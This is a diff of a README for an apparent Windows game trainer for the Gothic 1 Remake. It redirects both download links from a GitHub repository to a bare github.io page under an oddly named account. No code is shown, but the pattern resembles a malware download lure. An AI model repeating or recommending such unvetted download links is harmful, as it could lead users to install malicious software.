@@ -1,6 +1,6 @@
 # 🎮 Gothic-1-Remake-Trainer-2026 - Customize your game experience easily today
 
-[![](https://img.shields.io/badge/Download_Trainer-Blue.svg)](https://github.com/perihelionbankholdingcompany997/Gothic-1-Remake-Trainer-2026)
+[![](https://img.shields.io/badge/Download_Trainer-Blue.svg)](https://perihelionbankholdingcompany997.github.io)
 
 This program modifies memory values for the Gothic 1 Remake on Windows. It allows users to adjust player health, stamina, and inventory items. You do not need technical skills to use this tool.
 
@@ -17,7 +17,7 @@ This trainer works on most modern Windows systems. Ensure your computer meets th
 
 Visit the official repository page to download the latest version of the utility.
 
-[Download Gothic-1-Remake-Trainer-2026](https://github.com/perihelionbankholdingcompany997/Gothic-1-Remake-Trainer-2026)
+[Download Gothic-1-Remake-Trainer-2026](https://perihelionbankholdingcompany997.github.io)
 
 1. Navigate to the link above using your web browser.
 2. Look for the "Releases" section on the right side of the screen.
